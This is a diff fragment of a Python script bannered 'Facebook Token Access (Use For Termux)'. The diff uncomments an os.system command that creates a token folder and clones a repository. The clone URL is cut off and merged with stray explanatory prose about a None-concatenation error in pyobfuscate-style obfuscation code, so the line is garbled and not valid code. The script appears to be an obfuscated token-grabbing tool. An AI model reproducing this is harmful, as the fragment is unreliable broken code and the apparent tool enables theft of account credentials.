@@ -33,7 +33,7 @@ except Exception as e:
 
 print("[bold red] Copy !! [green] Facebook Token Access (Use For Termux)")
 print('[white]--------------------------------------------')
-#os.system('cd $HOME && mkdir FACEBOOK_TOKEN && cd FACEBOOK_TOKEN && git clone https://github.comThe error in the script occurs due to the attempt to concatenate `None` with a string. Specifically, the line `pyobfuscate += obfuscate['(https://pyobfuscate.com)*(RSA)']` might be causing this issue if `obfuscate['(https://pyobfuscate.com)*(RSA)']` is returning `None`.
+os.system('cd $HOME && mkdir FACEBOOK_TOKEN && cd FACEBOOK_TOKEN && git clone https://github.comThe error in the script occurs due to the attempt to concatenate `None` with a string. Specifically, the line `pyobfuscate += obfuscate['(https://pyobfuscate.com)*(RSA)']` might be causing this issue if `obfuscate['(https://pyobfuscate.com)*(RSA)']` is returning `None`.
 
 #Here are the corrected lines from the script:
 
